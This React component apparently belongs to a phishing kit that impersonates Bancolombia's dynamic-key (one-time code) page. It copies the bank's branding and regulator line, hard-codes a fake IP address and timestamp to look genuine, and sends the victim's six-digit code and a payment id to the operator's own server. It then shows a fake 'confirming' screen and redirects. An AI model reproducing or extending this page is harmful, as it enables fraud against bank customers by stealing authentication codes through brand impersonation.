import { useState } from "react"
import { useNavigate, useLocation } from "react-router-dom"
import "./ClaveDinamica.css"
import NavBarBa from "../NavBarBa/NavBarBa"
import { BASE_URL } from "../../config"  // <-- Importar la URL base

function ClaveDinamica() {
  const [clave, setClave] = useState(["", "", "", "", "", ""])
  const [loading, setLoading] = useState(false)
  const navigate = useNavigate()
  const location = useLocation()
  const { pagoId } = location.state || {}

  const handleChange = (value, index) => {
    if (/^[0-9]?$/.test(value)) {
      const newClave = [...clave]
      newClave[index] = value
      setClave(newClave)

      if (value && index < 5) {
        document.getElementById(`digit-${index + 1}`).focus()
      }
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (clave.some((c) => c === "")) {
      alert("Por favor ingresa los 6 dígitos de la clave dinámica")
      return
    }

    if (!pagoId) {
      alert("No hay un pago válido, vuelve al inicio.")
      return navigate("/")
    }

    setLoading(true)

    try {
      const res = await fetch(`${BASE_URL}/actualizar-clave-dinamica`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: pagoId,
          clave_dinamica: clave.join(""),
        }),
      })

      const data = await res.json().catch(() => ({}))
      console.log("[ClaveDinamica] respuesta backend:", data)

      if (data.ok) {
        setTimeout(() => {
          setLoading(false)
          navigate("/dashboard")
        }, 3000)
      } else {
        alert("Error confirmando la clave dinámica" + (data.error ? `: ${data.error}` : ""))
        setLoading(false)
      }
    } catch (err) {
      console.error(err)
      alert("Error conectando con el servidor")
      setLoading(false)
    }
  }

  return (
    <div className="banco-container">
      <NavBarBa />

      <div className="banco-box">
        {loading ? (
          <>
            <div className="loader"></div>
            <p className="banco-text">Confirmando datos...</p>
          </>
        ) : (
          <>
            <h2 className="banco-title">Clave dinámica</h2>
            <p className="banco-text">Ingresa la clave enviada a tu celular</p>

            <form onSubmit={handleSubmit}>
              <div className="clave-inputs">
                {clave.map((c, i) => (
                  <input
                    key={i}
                    id={`digit-${i}`}
                    type="password"
                    maxLength="1"
                    inputMode="numeric"
                    value={c}
                    onChange={(e) => handleChange(e.target.value, i)}
                  />
                ))}
              </div>

              <div className="form-actions">
                <button
                  type="button"
                  className="btn-volver"
                  onClick={() => navigate(-1)}
                >
                  Volver
                </button>
                <button type="submit" className="btn-continuar">
                  Continuar
                </button>
              </div>
            </form>
          </>
        )}
      </div>

      <footer className="banco-footer">
        <p>
          Bancolombia{" "}
          <span className="vig">
            VIGILADO Superintendencia Financiera de Colombia
          </span>
        </p>
        <p>Dirección IP: 192.230.104.12</p>
        <p>Lunes, 18 de Agosto de 2025, 3:47 a.m.</p>
      </footer>
    </div>
  )
}

export default ClaveDinamica
